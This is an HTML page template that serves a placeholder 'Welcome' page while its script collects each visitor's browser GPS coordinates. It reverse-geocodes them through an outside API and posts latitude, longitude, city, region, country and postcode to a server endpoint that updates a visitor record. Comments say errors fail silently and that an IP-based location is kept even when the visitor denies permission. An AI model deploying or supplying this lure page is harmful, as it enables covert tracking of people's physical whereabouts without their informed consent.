<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0d0d0d;
      color: #eee;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .box { text-align: center; padding: 40px; }
    h1 { font-size: 28px; margin-bottom: 10px; }
    p  { color: #888; font-size: 15px; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Welcome ðŸ‘‹</h1>
    <p>This page is being tracked silently.</p>
    <!-- Replace this content with your actual page -->
  </div>

  <script>
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          try {
            const { latitude, longitude, accuracy } = pos.coords;

            // Step 1: Use BigDataCloud to reverse geocode the GPS coords
            // to get the REAL city name â€” free, no API key needed
            const geoRes = await fetch(
              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
            );
            const geo = await geoRes.json();

            // Step 2: Send everything to the server to update the visitor record
            await fetch('/api/update-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                lat:         latitude,
                lon:         longitude,
                accuracy:    accuracy,
                city:        geo.city        || geo.locality       || '',
                region:      geo.principalSubdivision              || '',
                country:     geo.countryName                       || '',
                countryCode: geo.countryCode                       || '',
                zip:         geo.postcode                          || ''
              })
            });
          } catch (e) {
            // silently fail â€” IP location is still saved
          }
        },
        () => {} // user denied â€” IP location stays, no error
      );
    }
  </script>
</body>
</html>
